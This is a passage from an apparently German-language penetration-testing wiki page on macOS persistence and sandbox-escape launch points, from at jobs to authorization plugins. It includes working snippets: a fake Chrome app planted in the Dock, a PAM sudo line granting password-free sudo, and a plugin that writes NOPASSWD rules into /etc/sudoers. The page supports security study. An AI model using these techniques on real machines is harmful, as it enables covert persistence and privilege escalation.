SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Wenn AT-Aufgaben nicht aktiviert sind, werden die erstellten Aufgaben nicht ausgeführt.
{% endhint %}

Die **Job-Dateien** können unter `/private/var/at/jobs/` gefunden werden.
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Der Dateiname enthält die Warteschlange, die Jobnummer und die geplante Ausführungszeit. Zum Beispiel werfen wir einen Blick auf `a0001a019bdcd2`.

* `a` - dies ist die Warteschlange
* `0001a` - Jobnummer in Hexadezimal, `0x1a = 26`
* `019bdcd2` - Zeit in Hexadezimal. Es repräsentiert die vergangenen Minuten seit dem Epoch. `0x019bdcd2` entspricht `26991826` in Dezimal. Wenn wir es mit 60 multiplizieren, erhalten wir `1619509560`, was `GMT: 27. April 2021, Dienstag 7:46:00` entspricht.

Wenn wir die Jobdatei ausdrucken, stellen wir fest, dass sie die gleichen Informationen enthält, die wir mit `at -c` erhalten haben.

### Ordneraktionen

Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* Aber Sie müssen in der Lage sein, `osascript` mit Argumenten aufzurufen, um **`System Events`** zu kontaktieren und Ordneraktionen konfigurieren zu können.
* TCC-Umgehung: [🟠](https://emojipedia.org/large-orange-circle)
* Es hat einige grundlegende TCC-Berechtigungen wie Desktop, Dokumente und Downloads.

#### Ort

* **`/Library/Scripts/Folder Action Scripts`**
* Root-Berechtigung erforderlich
* **Auslöser**: Zugriff auf den angegebenen Ordner
* **`~/Library/Scripts/Folder Action Scripts`**
* **Auslöser**: Zugriff auf den angegebenen Ordner

#### Beschreibung & Ausnutzung

Ordneraktionen sind Skripte, die automatisch durch Änderungen in einem Ordner ausgelöst werden, z. B. das Hinzufügen oder Entfernen von Elementen oder andere Aktionen wie das Öffnen oder Ändern der Größe des Ordnerfensters. Diese Aktionen können für verschiedene Aufgaben genutzt werden und können auf verschiedene Arten ausgelöst werden, z. B. über die Finder-Benutzeroberfläche oder Terminalbefehle.

Um Ordneraktionen einzurichten, haben Sie folgende Möglichkeiten:

1. Erstellen eines Ordneraktions-Workflows mit [Automator](https://support.apple.com/guide/automator/welcome/mac) und Installation als Dienst.
2. Manuelles Anhängen eines Skripts über die Ordneraktions-Einrichtung im Kontextmenü eines Ordners.
3. Verwendung von OSAScript, um Apple Event-Nachrichten an die `System Events.app` zu senden, um programmgesteuert eine Ordneraktion einzurichten.
* Diese Methode ist besonders nützlich, um die Aktion in das System einzubetten und eine gewisse Persistenz zu bieten.

Das folgende Skript ist ein Beispiel dafür, was von einer Ordneraktion ausgeführt werden kann:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Um das obige Skript für Ordneraktionen verwendbar zu machen, kompilieren Sie es mit:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Nachdem das Skript kompiliert wurde, richten Sie Ordneraktionen ein, indem Sie das folgende Skript ausführen. Dieses Skript aktiviert Ordneraktionen global und fügt das zuvor kompilierte Skript speziell dem Desktop-Ordner hinzu.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Führen Sie das Setup-Skript mit folgendem Befehl aus:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* So implementieren Sie diese Persistenz über die GUI:

Dies ist das Skript, das ausgeführt wird:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Kompilieren Sie es mit: `osacompile -l JavaScript -o folder.scpt source.js`

Verschieben Sie es nach:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Dann öffnen Sie die App "Folder Actions Setup", wählen Sie den **Ordner, den Sie überwachen möchten**, und wählen Sie in Ihrem Fall **`folder.scpt`** (in meinem Fall habe ich es output2.scp genannt):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

Wenn Sie diesen Ordner jetzt mit dem **Finder** öffnen, wird Ihr Skript ausgeführt.

Diese Konfiguration wurde in der **plist** gespeichert, die sich im **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** im Base64-Format befindet.

Nun versuchen wir, diese Persistenz ohne GUI-Zugriff vorzubereiten:

1. **Kopieren Sie `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** nach `/tmp`, um es zu sichern:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Entfernen** Sie die gerade festgelegten Ordneraktionen:

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Jetzt, da wir eine leere Umgebung haben

3. Kopieren Sie die Sicherungsdatei: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Öffnen Sie die App "Folder Actions Setup", um diese Konfiguration zu übernehmen: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
Bei mir hat das nicht funktioniert, aber das sind die Anweisungen aus dem Writeup :(
{% endhint %}

### Dock-Verknüpfungen

Writeup: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* Aber Sie müssen eine bösartige Anwendung im System installiert haben
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

* `~/Library/Preferences/com.apple.dock.plist`
* **Auslöser**: Wenn der Benutzer auf die App im Dock klickt

#### Beschreibung & Ausnutzung

Alle Anwendungen, die im Dock angezeigt werden, sind in der plist spezifiziert: **`~/Library/Preferences/com.apple.dock.plist`**

Es ist möglich, eine Anwendung nur mit folgendem Befehl hinzuzufügen:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Durch **Social Engineering** könnten Sie sich beispielsweise als Google Chrome in der Dockleiste ausgeben und tatsächlich Ihr eigenes Skript ausführen:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Farbauswahl

Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Es muss eine sehr spezifische Aktion stattfinden
* Du wirst in einer anderen Sandbox landen
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* `/Library/ColorPickers`
* Root-Zugriff erforderlich
* Auslöser: Verwenden des Farbauswahlwerkzeugs
* `~/Library/ColorPickers`
* Auslöser: Verwenden des Farbauswahlwerkzeugs

#### Beschreibung & Exploit

**Kompilieren Sie ein Farbauswahl**-Bundle mit Ihrem Code (Sie könnten zum Beispiel [**dieses hier verwenden**](https://github.com/viktorstrate/color-picker-plus)) und fügen Sie einen Konstruktor hinzu (wie im Abschnitt [Bildschirmschoner](macos-auto-start-locations.md#screen-saver)) und kopieren Sie das Bundle in `~/Library/ColorPickers`.

Dann, wenn das Farbauswahlwerkzeug ausgelöst wird, sollte auch Ihr Code ausgeführt werden.

Beachten Sie, dass die Binärdatei, die Ihre Bibliothek lädt, eine **sehr restriktive Sandbox** hat: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Writeup**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Nützlich, um die Sandbox zu umgehen: **Nein, da Sie Ihre eigene App ausführen müssen**
* TCC-Bypass: ???

#### Standort

* Eine bestimmte App

#### Beschreibung & Exploit

Ein Beispiel für eine Anwendung mit einer Finder Sync Extension [**finden Sie hier**](https://github.com/D00MFist/InSync).

Anwendungen können `Finder Sync Extensions` haben. Diese Erweiterung wird in einer Anwendung platziert, die ausgeführt wird. Außerdem muss die Erweiterung, um ihren Code ausführen zu können, **mit einem gültigen Apple-Entwicklerzertifikat signiert sein**, sie muss **gesandboxt** sein (obwohl entspannte Ausnahmen hinzugefügt werden können) und sie muss mit etwas wie dem Folgenden registriert sein:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Bildschirmschoner

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Aber du wirst in einer gängigen Anwendungssandbox landen
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* `/System/Library/Screen Savers`
* Root-Berechtigung erforderlich
* **Auslöser**: Wählen Sie den Bildschirmschoner aus
* `/Library/Screen Savers`
* Root-Berechtigung erforderlich
* **Auslöser**: Wählen Sie den Bildschirmschoner aus
* `~/Library/Screen Savers`
* **Auslöser**: Wählen Sie den Bildschirmschoner aus

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beschreibung & Exploit

Erstellen Sie ein neues Projekt in Xcode und wählen Sie die Vorlage, um einen neuen **Bildschirmschoner** zu generieren. Fügen Sie dann Ihren Code hinzu, zum Beispiel den folgenden Code, um Protokolle zu generieren.

**Bauen** Sie es und kopieren Sie das `.saver`-Bundle in **`~/Library/Screen Savers`**. Öffnen Sie dann die Bildschirmschoner-GUI und wenn Sie darauf klicken, sollten viele Protokolle generiert werden:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Beachten Sie, dass Sie sich aufgrund der Berechtigungen der Binärdatei, die diesen Code lädt (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), **innerhalb des allgemeinen Anwendungssandkastens** befinden.
{% endhint %}

Saver-Code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight-Plugins

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Aber du wirst in einer Anwendungs-Sandbox landen
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)
* Die Sandbox scheint sehr begrenzt zu sein

#### Standort

* `~/Library/Spotlight/`
* **Auslöser**: Eine neue Datei mit einer von dem Spotlight-Plugin verwalteten Erweiterung wird erstellt.
* `/Library/Spotlight/`
* **Auslöser**: Eine neue Datei mit einer von dem Spotlight-Plugin verwalteten Erweiterung wird erstellt.
* Root-Berechtigung erforderlich
* `/System/Library/Spotlight/`
* **Auslöser**: Eine neue Datei mit einer von dem Spotlight-Plugin verwalteten Erweiterung wird erstellt.
* Root-Berechtigung erforderlich
* `Some.app/Contents/Library/Spotlight/`
* **Auslöser**: Eine neue Datei mit einer von dem Spotlight-Plugin verwalteten Erweiterung wird erstellt.
* Neue App erforderlich

#### Beschreibung & Ausnutzung

Spotlight ist die integrierte Suchfunktion von macOS, die Benutzern einen schnellen und umfassenden Zugriff auf Daten auf ihren Computern ermöglicht.\
Um diese schnelle Suchfunktion zu ermöglichen, verwaltet Spotlight eine **eigene Datenbank** und erstellt einen Index, indem es die meisten Dateien analysiert, was schnelle Suchen sowohl nach Dateinamen als auch nach deren Inhalt ermöglicht.

Der zugrunde liegende Mechanismus von Spotlight umfasst einen zentralen Prozess namens 'mds', der für den gesamten Spotlight-Dienst verantwortlich ist. Ergänzend dazu gibt es mehrere 'mdworker'-Daemons, die verschiedene Wartungsaufgaben durchführen, wie z.B. das Indizieren verschiedener Dateitypen (`ps -ef | grep mdworker`). Diese Aufgaben werden durch Spotlight-Importer-Plugins oder **".mdimporter-Bundles**" ermöglicht, die Spotlight in die Lage versetzen, Inhalte in einer Vielzahl von Dateiformaten zu verstehen und zu indizieren.

Die Plugins oder **`.mdimporter`**-Bundles befinden sich an den zuvor genannten Orten und wenn ein neues Bundle auftaucht, wird es innerhalb von Minuten geladen (es ist kein Neustart eines Dienstes erforderlich). Diese Bundles müssen angeben, welche **Dateitypen und Erweiterungen sie verwalten können**, damit Spotlight sie verwendet, wenn eine neue Datei mit der angegebenen Erweiterung erstellt wird.

Es ist möglich, **alle geladenen `mdimporters`** zu finden, indem man Folgendes ausführt:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Und zum Beispiel wird **/Library/Spotlight/iBooksAuthor.mdimporter** verwendet, um diese Art von Dateien zu analysieren (Erweiterungen `.iba` und `.book` unter anderem):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Wenn Sie die Plist eines anderen `mdimporter` überprüfen, finden Sie möglicherweise nicht den Eintrag **`UTTypeConformsTo`**. Das liegt daran, dass es sich um einen integrierten _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) handelt und keine Erweiterungen angegeben werden müssen.

Darüber hinaus haben Systemstandard-Plugins immer Vorrang, sodass ein Angreifer nur auf Dateien zugreifen kann, die nicht anderweitig von Apples eigenen `mdimporters` indiziert werden.
{% endhint %}

Um Ihren eigenen Importer zu erstellen, können Sie mit diesem Projekt beginnen: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) und dann den Namen, die **`CFBundleDocumentTypes`** ändern und **`UTImportedTypeDeclarations`** hinzufügen, damit es die gewünschte Erweiterung unterstützt und diese in **`schema.xml`** reflektiert.\
Ändern Sie dann den Code der Funktion **`GetMetadataForFile`**, um Ihre Nutzlast auszuführen, wenn eine Datei mit der verarbeiteten Erweiterung erstellt wird.

Schließlich **bauen und kopieren Sie Ihren neuen `.mdimporter`** an einen der vorherigen Speicherorte und Sie können überprüfen, wann er geladen wird, indem Sie die Protokolle überwachen oder **`mdimport -L.`** überprüfen.

### ~~Einstellungsfenster~~

{% hint style="danger" %}
Es scheint, dass dies nicht mehr funktioniert.
{% endhint %}

Bericht: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Es erfordert eine spezifische Benutzeraktion
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Beschreibung

Es scheint, dass dies nicht mehr funktioniert.

## Root-Sandbox-Umgehung

{% hint style="success" %}
Hier finden Sie Startorte, die für die **Sandbox-Umgehung** nützlich sind und es Ihnen ermöglichen, einfach etwas auszuführen, indem Sie es in eine Datei schreiben, die **root** ist und/oder andere **seltsame Bedingungen** erfordert.
{% endhint %}

### Periodisch

Bericht: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Aber Sie müssen root sein
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Root erforderlich
* **Auslöser**: Wenn die Zeit gekommen ist
* `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local`
* Root erforderlich
* **Auslöser**: Wenn die Zeit gekommen ist

#### Beschreibung & Ausnutzung

Die periodischen Skripte (**`/etc/periodic`**) werden aufgrund der in `/System/Library/LaunchDaemons/com.apple.periodic*` konfigurierten **Launch Daemons** ausgeführt. Beachten Sie, dass Skripte, die in `/etc/periodic/` gespeichert sind, als **Besitzer der Datei** ausgeführt werden, sodass dies nicht für eine potenzielle Privilegserweiterung funktioniert.

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Es gibt andere periodische Skripte, die in **`/etc/defaults/periodic.conf`** angegeben werden und ausgeführt werden.
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Wenn es Ihnen gelingt, eine der Dateien `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local` zu schreiben, wird sie **früher oder später ausgeführt**.

{% hint style="warning" %}
Beachten Sie, dass das periodische Skript als der Besitzer des Skripts ausgeführt wird. Wenn ein regulärer Benutzer das Skript besitzt, wird es als dieser Benutzer ausgeführt (dies kann Angriffe auf Privilegierungs-Eskalation verhindern).
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Aber Sie müssen root sein
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* Immer Root-Berechtigungen erforderlich

#### Beschreibung & Ausnutzung

Da PAM mehr auf **Persistenz** und Malware als auf einfache Ausführung in macOS ausgerichtet ist, gibt dieser Blog keine detaillierte Erklärung. **Lesen Sie die Writeups, um diese Technik besser zu verstehen**.

Überprüfen Sie PAM-Module mit:
```bash
ls -l /etc/pam.d
```
Eine Persistenz-/Privileg-Eskalationstechnik, die PAM missbraucht, ist so einfach wie die Modifikation des Moduls /etc/pam.d/sudo, indem am Anfang die Zeile hinzugefügt wird:
```bash
auth       sufficient     pam_permit.so
```
So wird es **etwa so aussehen**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Und daher wird jeder Versuch, **`sudo` zu verwenden, funktionieren**.

{% hint style="danger" %}
Beachten Sie, dass dieses Verzeichnis durch TCC geschützt ist, daher ist es sehr wahrscheinlich, dass der Benutzer zur Eingabe aufgefordert wird.
{% endhint %}

### Autorisierungs-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Aber Sie müssen root sein und zusätzliche Konfigurationen vornehmen
* TCC-Umgehung: ???

#### Speicherort

* `/Library/Security/SecurityAgentPlugins/`
* Root-Berechtigung erforderlich
* Es ist auch erforderlich, die Autorisierungsdatenbank so zu konfigurieren, dass das Plugin verwendet wird

#### Beschreibung & Ausnutzung

Sie können ein Autorisierungs-Plugin erstellen, das ausgeführt wird, wenn sich ein Benutzer anmeldet, um die Persistenz aufrechtzuerhalten. Weitere Informationen zur Erstellung eines solchen Plugins finden Sie in den vorherigen Writeups (und seien Sie vorsichtig, ein schlecht geschriebenes Plugin kann Sie aussperren und Sie müssen Ihren Mac im Wiederherstellungsmodus bereinigen).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Verschieben** Sie das Bundle an den Ort, an dem es geladen werden soll:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Schließlich fügen Sie die **Regel** hinzu, um dieses Plugin zu laden:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Die **`evaluate-mechanisms`** geben dem Autorisierungsframework an, dass es einen **externen Mechanismus für die Autorisierung aufrufen** muss. Darüber hinaus wird durch **`privileged`** sichergestellt, dass es als Root-Benutzer ausgeführt wird.

Auslösen mit:
```bash
security authorize com.asdf.asdf
```
Und dann sollte die **Gruppe "staff" sudo-Zugriff haben** (lesen Sie `/etc/sudoers`, um dies zu bestätigen).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
* Aber Sie müssen root sein und der Benutzer muss man verwenden
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* **`/private/etc/man.conf`**
* Root erforderlich
* **`/private/etc/man.conf`**: Immer wenn man verwendet wird

#### Beschreibung & Exploit

